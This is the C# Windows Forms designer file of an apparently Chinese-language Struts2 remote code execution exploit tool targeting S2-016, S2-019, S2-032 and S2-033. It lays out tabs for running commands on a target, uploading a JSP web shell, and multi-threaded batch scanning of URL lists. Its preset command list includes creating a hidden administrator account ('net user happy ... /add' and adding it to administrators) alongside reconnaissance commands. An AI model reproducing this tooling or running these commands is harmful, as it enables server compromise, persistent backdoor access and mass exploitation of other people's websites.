using System.Threading;
using System.Windows.Forms;
namespace Struts2
{
    partial class Form1
    {
        /// <summary>
        /// 必需的设计器变量。
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// 清理所有正在使用的资源。
        /// </summary>
        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows 窗体设计器生成的代码

        /// <summary>
        /// 设计器支持所需的方法 - 不要
        /// 使用代码编辑器修改此方法的内容。
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.LabUrl = new System.Windows.Forms.Label();
            this.TxtUrl = new System.Windows.Forms.TextBox();
            this.BtnUrlPaste = new System.Windows.Forms.Button();
            this.BtnUrlCopy = new System.Windows.Forms.Button();
            this.Radb032 = new System.Windows.Forms.RadioButton();
            this.Radb019 = new System.Windows.Forms.RadioButton();
            this.Radb016 = new System.Windows.Forms.RadioButton();
            this.BtnStart = new System.Windows.Forms.Button();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.TxtInfo = new System.Windows.Forms.TextBox();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.TxtCmd = new System.Windows.Forms.ComboBox();
            this.TxtCmdResult = new System.Windows.Forms.TextBox();
            this.button2 = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.TxtShellContent = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.button3 = new System.Windows.Forms.Button();
            this.TxtPath = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.TxtName = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.bt_lvw = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.label15 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.lbl_bt_ok = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.Thr_method = new System.Windows.Forms.ComboBox();
            this.txt_bt_url_path = new System.Windows.Forms.TextBox();
            this.button7 = new System.Windows.Forms.Button();
            this.BtnEnd = new System.Windows.Forms.Button();
            this.BtnBegin = new System.Windows.Forms.Button();
            this.button4 = new System.Windows.Forms.Button();
            this.lbl_bt_sucess = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.lbl_bt_sum = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.TxtLog = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.tim_bt = new System.Windows.Forms.Timer(this.components);
            this.Radb033 = new System.Windows.Forms.RadioButton();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.SuspendLayout();
            // 
            // LabUrl
            // 
            this.LabUrl.AutoSize = true;
            this.LabUrl.BackColor = System.Drawing.SystemColors.Control;
            this.LabUrl.Cursor = System.Windows.Forms.Cursors.Default;
            this.LabUrl.Font = new System.Drawing.Font("宋体", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.LabUrl.Location = new System.Drawing.Point(22, 20);
            this.LabUrl.Name = "LabUrl";
            this.LabUrl.Size = new System.Drawing.Size(95, 12);
            this.LabUrl.TabIndex = 0;
            this.LabUrl.Text = "请输入目标URL：";
            // 
            // TxtUrl
            // 
            this.TxtUrl.Location = new System.Drawing.Point(118, 16);
            this.TxtUrl.Name = "TxtUrl";
            this.TxtUrl.Size = new System.Drawing.Size(375, 21);
            this.TxtUrl.TabIndex = 1;
            this.TxtUrl.Text = "http://www.xxx.com/xxx.action";
            // 
            // BtnUrlPaste
            // 
            this.BtnUrlPaste.Font = new System.Drawing.Font("宋体", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.BtnUrlPaste.Location = new System.Drawing.Point(523, 13);
            this.BtnUrlPaste.Name = "BtnUrlPaste";
            this.BtnUrlPaste.Size = new System.Drawing.Size(84, 27);
            this.BtnUrlPaste.TabIndex = 2;
            this.BtnUrlPaste.Text = "清空并粘贴";
            this.BtnUrlPaste.UseVisualStyleBackColor = true;
            this.BtnUrlPaste.Click += new System.EventHandler(this.BtnUrlPaste_Click);
            // 
            // BtnUrlCopy
            // 
            this.BtnUrlCopy.Location = new System.Drawing.Point(633, 12);
            this.BtnUrlCopy.Name = "BtnUrlCopy";
            this.BtnUrlCopy.Size = new System.Drawing.Size(84, 27);
            this.BtnUrlCopy.TabIndex = 3;
            this.BtnUrlCopy.Text = "复制当前URL";
            this.BtnUrlCopy.UseVisualStyleBackColor = true;
            this.BtnUrlCopy.Click += new System.EventHandler(this.BtnUrlCopy_Click);
            // 
            // Radb032
            // 
            this.Radb032.AutoSize = true;
            this.Radb032.Location = new System.Drawing.Point(310, 54);
            this.Radb032.Name = "Radb032";
            this.Radb032.Size = new System.Drawing.Size(125, 16);
            this.Radb032.TabIndex = 5;
            this.Radb032.Text = "2016 St2-032 漏洞";
            this.Radb032.UseVisualStyleBackColor = true;
            // 
            // Radb019
            // 
            this.Radb019.AutoSize = true;
            this.Radb019.Location = new System.Drawing.Point(169, 54);
            this.Radb019.Name = "Radb019";
            this.Radb019.Size = new System.Drawing.Size(125, 16);
            this.Radb019.TabIndex = 6;
            this.Radb019.Text = "2013 St2-019 漏洞";
            this.Radb019.UseVisualStyleBackColor = true;
            // 
            // Radb016
            // 
            this.Radb016.AutoSize = true;
            this.Radb016.Checked = true;
            this.Radb016.Location = new System.Drawing.Point(24, 54);
            this.Radb016.Name = "Radb016";
            this.Radb016.Size = new System.Drawing.Size(125, 16);
            this.Radb016.TabIndex = 7;
            this.Radb016.TabStop = true;
            this.Radb016.Text = "2013 St2-016 漏洞";
            this.Radb016.UseVisualStyleBackColor = true;
            // 
            // BtnStart
            // 
            this.BtnStart.Location = new System.Drawing.Point(586, 45);
            this.BtnStart.Name = "BtnStart";
            this.BtnStart.Size = new System.Drawing.Size(134, 34);
            this.BtnStart.TabIndex = 8;
            this.BtnStart.Text = "开始检测";
            this.BtnStart.UseVisualStyleBackColor = true;
            this.BtnStart.Click += new System.EventHandler(this.BtnStart_Click);
            // 
            // tabControl1
            // 
            this.tabControl1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage4);
            this.tabControl1.Location = new System.Drawing.Point(15, 85);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(709, 409);
            this.tabControl1.TabIndex = 9;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.TxtInfo);
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(701, 383);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "目标信息";
            this.tabPage1.UseVisualStyleBackColor = true;
            // 
            // TxtInfo
            // 
            this.TxtInfo.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TxtInfo.Location = new System.Drawing.Point(3, 3);
            this.TxtInfo.Multiline = true;
            this.TxtInfo.Name = "TxtInfo";
            this.TxtInfo.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.TxtInfo.Size = new System.Drawing.Size(695, 373);
            this.TxtInfo.TabIndex = 0;
            this.TxtInfo.Text = "\r\nHappy269 Struts2综合漏洞利用工具 (Apache Struts Remote Code Execution Exploit)\r\n\r\n-----" +
    "-作者: Happy269\r\n\r\n声明:本工具为漏洞自查工具，仅供安全检测或网络攻防研究,，请勿非法攻击他人网站，一切非法用途后果自负！\r\n";
            this.TxtInfo.KeyDown += new System.Windows.Forms.KeyEventHandler(this.TxtInfo_KeyDown);
            // 
            // tabPage2
            // 
            this.tabPage2.Controls.Add(this.TxtCmd);
            this.tabPage2.Controls.Add(this.TxtCmdResult);
            this.tabPage2.Controls.Add(this.button2);
            this.tabPage2.Controls.Add(this.button1);
            this.tabPage2.Controls.Add(this.label2);
            this.tabPage2.Location = new System.Drawing.Point(4, 22);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(701, 383);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "执行命令";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // TxtCmd
            // 
            this.TxtCmd.FormattingEnabled = true;
            this.TxtCmd.Items.AddRange(new object[] {
            "whoami",
            "netstat -an",
            "cmd /c ipconfig /all",
            "cmd /c systeminfo",
            "cmd /c net user",
            "cmd /c net user happy Happy!@#269 /add",
            "cmd /c net localgroup administrators happy /add",
            "ls",
            "set",
            "ifconfig",
            "uname -a",
            "uname -r",
            "lsb_release -a"});
            this.TxtCmd.Location = new System.Drawing.Point(123, 8);
            this.TxtCmd.Name = "TxtCmd";
            this.TxtCmd.Size = new System.Drawing.Size(281, 20);
            this.TxtCmd.TabIndex = 5;
            this.TxtCmd.Text = "whoami";
            // 
            // TxtCmdResult
            // 
            this.TxtCmdResult.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TxtCmdResult.Location = new System.Drawing.Point(8, 35);
            this.TxtCmdResult.Multiline = true;
            this.TxtCmdResult.Name = "TxtCmdResult";
            this.TxtCmdResult.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.TxtCmdResult.Size = new System.Drawing.Size(686, 336);
            this.TxtCmdResult.TabIndex = 4;
            this.TxtCmdResult.Text = "\r\n注：回显字符如果太长，可能只会显示前面部分!但是命令都能执行，可能回显会不完全，或没有回显!";
            this.TxtCmdResult.KeyDown += new System.Windows.Forms.KeyEventHandler(this.TxtCmdResult_KeyDown);
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(498, 6);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(177, 23);
            this.button2.TabIndex = 3;
            this.button2.Text = "批量执行（在cmd.txt中输入）";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(410, 6);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(82, 23);
            this.button1.TabIndex = 2;
            this.button1.Text = "执行命令";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(6, 11);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(125, 12);
            this.label2.TabIndex = 0;
            this.label2.Text = "请输入待执行的命令：";
            // 
            // tabPage3
            // 
            this.tabPage3.Controls.Add(this.TxtShellContent);
            this.tabPage3.Controls.Add(this.label5);
            this.tabPage3.Controls.Add(this.button3);
            this.tabPage3.Controls.Add(this.TxtPath);
            this.tabPage3.Controls.Add(this.label4);
            this.tabPage3.Controls.Add(this.TxtName);
            this.tabPage3.Controls.Add(this.label3);
            this.tabPage3.Location = new System.Drawing.Point(4, 22);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage3.Size = new System.Drawing.Size(701, 383);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "上传文件";
            this.tabPage3.UseVisualStyleBackColor = true;
            // 
            // TxtShellContent
            // 
            this.TxtShellContent.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TxtShellContent.Location = new System.Drawing.Point(6, 48);
            this.TxtShellContent.Multiline = true;
            this.TxtShellContent.Name = "TxtShellContent";
            this.TxtShellContent.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.TxtShellContent.Size = new System.Drawing.Size(688, 329);
            this.TxtShellContent.TabIndex = 6;
            this.TxtShellContent.Text = resources.GetString("TxtShellContent.Text");
            this.TxtShellContent.TextChanged += new System.EventHandler(this.textBox7_TextChanged);
            this.TxtShellContent.KeyDown += new System.Windows.Forms.KeyEventHandler(this.TxtShellContent_KeyDown);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(10, 33);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(137, 12);
            this.label5.TabIndex = 5;
            this.label5.Text = "上传内容（可自定义）：";
            // 
            // button3
            // 
            this.button3.Location = new System.Drawing.Point(583, 6);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(92, 22);
            this.button3.TabIndex = 4;
            this.button3.Text = "点击上传";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // TxtPath
            // 
            this.TxtPath.Location = new System.Drawing.Point(328, 6);
            this.TxtPath.Name = "TxtPath";
            this.TxtPath.Size = new System.Drawing.Size(240, 21);
            this.TxtPath.TabIndex = 3;
            this.TxtPath.Text = "如：/var/www/html/happy.jsp";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(230, 11);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(101, 12);
            this.label4.TabIndex = 2;
            this.label4.Text = "自定义上传路径：";
            // 
            // TxtName
            // 
            this.TxtName.Location = new System.Drawing.Point(115, 6);
            this.TxtName.Name = "TxtName";
            this.TxtName.Size = new System.Drawing.Size(107, 21);
            this.TxtName.TabIndex = 1;
            this.TxtName.Text = "happy.jsp";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(3, 10);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(113, 12);
            this.label3.TabIndex = 0;
            this.label3.Text = "上传生成的文件名：";
            // 
            // tabPage4
            // 
            this.tabPage4.Controls.Add(this.bt_lvw);
            this.tabPage4.Controls.Add(this.label15);
            this.tabPage4.Controls.Add(this.label14);
            this.tabPage4.Controls.Add(this.lbl_bt_ok);
            this.tabPage4.Controls.Add(this.label12);
            this.tabPage4.Controls.Add(this.Thr_method);
            this.tabPage4.Controls.Add(this.txt_bt_url_path);
            this.tabPage4.Controls.Add(this.button7);
            this.tabPage4.Controls.Add(this.BtnEnd);
            this.tabPage4.Controls.Add(this.BtnBegin);
            this.tabPage4.Controls.Add(this.button4);
            this.tabPage4.Controls.Add(this.lbl_bt_sucess);
            this.tabPage4.Controls.Add(this.label10);
            this.tabPage4.Controls.Add(this.label9);
            this.tabPage4.Controls.Add(this.lbl_bt_sum);
            this.tabPage4.Controls.Add(this.label7);
            this.tabPage4.Controls.Add(this.label6);
            this.tabPage4.Location = new System.Drawing.Point(4, 22);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage4.Size = new System.Drawing.Size(701, 383);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "批量检测";
            this.tabPage4.UseVisualStyleBackColor = true;
            // 
            // bt_lvw
            // 
            this.bt_lvw.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.bt_lvw.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3,
            this.columnHeader4});
            this.bt_lvw.Location = new System.Drawing.Point(6, 65);
            this.bt_lvw.Name = "bt_lvw";
            this.bt_lvw.Size = new System.Drawing.Size(689, 315);
            this.bt_lvw.TabIndex = 16;
            this.bt_lvw.UseCompatibleStateImageBehavior = false;
            this.bt_lvw.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "目标URL";
            this.columnHeader1.Width = 217;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "是否存在漏洞";
            this.columnHeader2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.columnHeader2.Width = 88;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "目标WEB根目录";
            this.columnHeader3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.columnHeader3.Width = 230;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "执行命令（whoami）";
            this.columnHeader4.Width = 132;
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Location = new System.Drawing.Point(413, 42);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(11, 12);
            this.label15.TabIndex = 15;
            this.label15.Text = "0";
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Location = new System.Drawing.Point(354, 42);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(53, 12);
            this.label14.TabIndex = 14;
            this.label14.Text = "已耗时：";
            // 
            // lbl_bt_ok
            // 
            this.lbl_bt_ok.AutoSize = true;
            this.lbl_bt_ok.Location = new System.Drawing.Point(320, 42);
            this.lbl_bt_ok.Name = "lbl_bt_ok";
            this.lbl_bt_ok.Size = new System.Drawing.Size(11, 12);
            this.lbl_bt_ok.TabIndex = 13;
            this.lbl_bt_ok.Text = "0";
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(213, 42);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(101, 12);
            this.label12.TabIndex = 12;
            this.label12.Text = "目标存在漏洞数：";
            // 
            // Thr_method
            // 
            this.Thr_method.FormattingEnabled = true;
            this.Thr_method.Items.AddRange(new object[] {
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "15",
            "20",
            "25",
            "30",
            "35",
            "40",
            "50",
            "60",
            "70",
            "80",
            "90",
            "100",
            "150",
            "200"});
            this.Thr_method.Location = new System.Drawing.Point(52, 10);
            this.Thr_method.Name = "Thr_method";
            this.Thr_method.Size = new System.Drawing.Size(53, 20);
            this.Thr_method.TabIndex = 11;
            this.Thr_method.Text = "1";
            // 
            // txt_bt_url_path
            // 
            this.txt_bt_url_path.Location = new System.Drawing.Point(195, 9);
            this.txt_bt_url_path.Name = "txt_bt_url_path";
            this.txt_bt_url_path.Size = new System.Drawing.Size(258, 21);
            this.txt_bt_url_path.TabIndex = 10;
            // 
            // button7
            // 
            this.button7.Location = new System.Drawing.Point(464, 34);
            this.button7.Name = "button7";
            this.button7.Size = new System.Drawing.Size(91, 25);
            this.button7.TabIndex = 9;
            this.button7.Text = "查看 漏洞URL";
            this.button7.UseVisualStyleBackColor = true;
            this.button7.Click += new System.EventHandler(this.button7_Click);
            // 
            // BtnEnd
            // 
            this.BtnEnd.Location = new System.Drawing.Point(561, 34);
            this.BtnEnd.Name = "BtnEnd";
            this.BtnEnd.Size = new System.Drawing.Size(105, 25);
            this.BtnEnd.TabIndex = 8;
            this.BtnEnd.Text = "点击结束验证";
            this.BtnEnd.UseVisualStyleBackColor = true;
            this.BtnEnd.Click += new System.EventHandler(this.BtnEnd_Click);
            // 
            // BtnBegin
            // 
            this.BtnBegin.Location = new System.Drawing.Point(561, 7);
            this.BtnBegin.Name = "BtnBegin";
            this.BtnBegin.Size = new System.Drawing.Size(105, 24);
            this.BtnBegin.TabIndex = 7;
            this.BtnBegin.Text = "点击开始验证";
            this.BtnBegin.UseVisualStyleBackColor = true;
            this.BtnBegin.Click += new System.EventHandler(this.button5_Click);
            // 
            // button4
            // 
            this.button4.Location = new System.Drawing.Point(464, 7);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(91, 24);
            this.button4.TabIndex = 6;
            this.button4.Text = "导入 URL文件";
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // lbl_bt_sucess
            // 
            this.lbl_bt_sucess.AutoSize = true;
            this.lbl_bt_sucess.Location = new System.Drawing.Point(179, 42);
            this.lbl_bt_sucess.Name = "lbl_bt_sucess";
            this.lbl_bt_sucess.Size = new System.Drawing.Size(11, 12);
            this.lbl_bt_sucess.TabIndex = 5;
            this.lbl_bt_sucess.Text = "0";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(114, 42);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(65, 12);
            this.label10.TabIndex = 4;
            this.label10.Text = "已检测数：";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(15, 42);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(59, 12);
            this.label9.TabIndex = 3;
            this.label9.Text = "URL总数：";
            // 
            // lbl_bt_sum
            // 
            this.lbl_bt_sum.AutoSize = true;
            this.lbl_bt_sum.Location = new System.Drawing.Point(80, 42);
            this.lbl_bt_sum.Name = "lbl_bt_sum";
            this.lbl_bt_sum.Size = new System.Drawing.Size(11, 12);
            this.lbl_bt_sum.TabIndex = 2;
            this.lbl_bt_sum.Text = "0";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(114, 13);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(89, 12);
            this.label7.TabIndex = 1;
            this.label7.Text = "需检测的文件：";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(15, 13);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(41, 12);
            this.label6.TabIndex = 0;
            this.label6.Text = "线程：";
            // 
            // TxtLog
            // 
            this.TxtLog.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TxtLog.Location = new System.Drawing.Point(15, 512);
            this.TxtLog.Multiline = true;
            this.TxtLog.Name = "TxtLog";
            this.TxtLog.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.TxtLog.Size = new System.Drawing.Size(708, 79);
            this.TxtLog.TabIndex = 10;
            this.TxtLog.KeyDown += new System.Windows.Forms.KeyEventHandler(this.TxtLog_KeyDown);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("宋体", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.label1.Location = new System.Drawing.Point(16, 497);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(65, 12);
            this.label1.TabIndex = 11;
            this.label1.Text = "实时状态：";
            // 
            // tim_bt
            // 
            this.tim_bt.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // Radb033
            // 
            this.Radb033.AutoSize = true;
            this.Radb033.Location = new System.Drawing.Point(455, 54);
            this.Radb033.Name = "Radb033";
            this.Radb033.Size = new System.Drawing.Size(125, 16);
            this.Radb033.TabIndex = 1;
            this.Radb033.Text = "2016 St2-033 漏洞";
            this.Radb033.UseVisualStyleBackColor = true;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(745, 595);
            this.Controls.Add(this.Radb033);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.TxtLog);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.BtnStart);
            this.Controls.Add(this.Radb016);
            this.Controls.Add(this.Radb019);
            this.Controls.Add(this.Radb032);
            this.Controls.Add(this.BtnUrlCopy);
            this.Controls.Add(this.BtnUrlPaste);
            this.Controls.Add(this.TxtUrl);
            this.Controls.Add(this.LabUrl);
            this.Font = new System.Drawing.Font("宋体", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.Name = "Form1";
            this.Text = "Struts2 漏洞利用程序 ------ By Happy269  ";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.Resize += new System.EventHandler(this.Form1_Resize);
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage1.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.tabPage3.ResumeLayout(false);
            this.tabPage3.PerformLayout();
            this.tabPage4.ResumeLayout(false);
            this.tabPage4.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private void Form1_Load(object sender, System.EventArgs e)
        {
          // throw new System.NotImplementedException();
        }

        private void Form1_Resize(object sender, System.EventArgs e)
        {
           // throw new System.NotImplementedException();
        }

        private void button5_Click(object sender, System.EventArgs e)
        {
            if (this.bt_sum == 0)
            {
                MessageBox.Show("请导入列表");
            }
            else
            {
                this.bt_list_url_sucess.Clear();
                this.bt_lvw.Items.Clear();
                this.tim_bt.Enabled = true;
                this.tim_bt.Start();
                try
                {
                    this.bt_thread_size = int.Parse(this.Thr_method.Text);
                }
                catch
                {
                    MessageBox.Show("线程设置错误，将默认使用用" + this.bt_thread_size + "个线程！");
                }
                this.BtnBegin.Enabled = false;
                this.c_th = new Thread(new ThreadStart(this.scan));
                this.c_th.Start();
            }

        }


        private void textBox7_TextChanged(object sender, System.EventArgs e)
        {
           // throw new System.NotImplementedException();
        }

        #endregion

        private System.Windows.Forms.Label LabUrl;
        private System.Windows.Forms.TextBox TxtUrl;
        private System.Windows.Forms.Button BtnUrlPaste;
        private System.Windows.Forms.Button BtnUrlCopy;
        private System.Windows.Forms.RadioButton Radb032;
        private System.Windows.Forms.RadioButton Radb019;
        private System.Windows.Forms.RadioButton Radb016;
        private System.Windows.Forms.Button BtnStart;
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.TextBox TxtLog;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TabPage tabPage3;
        private System.Windows.Forms.TabPage tabPage4;
        private System.Windows.Forms.TextBox TxtCmdResult;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox TxtShellContent;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.TextBox TxtPath;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox TxtName;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.ComboBox TxtCmd;
        private System.Windows.Forms.ComboBox Thr_method;
        private System.Windows.Forms.TextBox txt_bt_url_path;
        private System.Windows.Forms.Button button7;
        private System.Windows.Forms.Button BtnEnd;
        private System.Windows.Forms.Button BtnBegin;
        private System.Windows.Forms.Button button4;
        private System.Windows.Forms.Label lbl_bt_sucess;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label lbl_bt_sum;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.ListView bt_lvw;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ColumnHeader columnHeader3;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        private System.Windows.Forms.Label label15;
        private System.Windows.Forms.Label label14;
        private System.Windows.Forms.Label lbl_bt_ok;
        private System.Windows.Forms.Label label12;
        private System.Windows.Forms.TextBox TxtInfo;
        private System.Windows.Forms.Timer tim_bt;
        private RadioButton Radb033;

        public System.EventHandler tabPage1_Click { get; set; }
    }
}

